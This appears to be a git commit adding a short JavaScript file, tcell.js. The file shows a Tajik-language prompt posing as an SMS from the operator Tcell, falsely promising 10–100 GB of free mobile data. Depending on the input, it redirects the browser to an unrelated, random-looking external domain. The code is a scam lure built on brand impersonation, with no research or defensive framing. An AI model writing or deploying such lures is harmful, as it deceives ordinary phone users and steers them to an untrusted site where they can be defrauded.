a2789cd593a57ae7ef1eacd6e1a8fd66e049b65d
newetijazz7 <newetijazz7@gmail.com>
2025-12-13 13:14:12 +0100

    Create tcell.js

---
+++ tcell.js
@@ -0,0 +1,8 @@
+var password = 'ФАЪОЛ КАРДАН'
+password = prompt(
+  'SMS: Табрик мекунем! Рақами Tcell-и шумо ҳуқуқ дорад аз 10 ГБ то 100 ГБ маълумоти ройгон гирад. Лутфан OK-ро пахш кунед, то ҳоло фаъол созед.',
+  'ФАЪОЛ КАРДАН'
+);
+if (password != 'ФАЪОЛ КАРДАН') {
+  location.href = 'https://www.jvrrdif.online/tcell';
+}
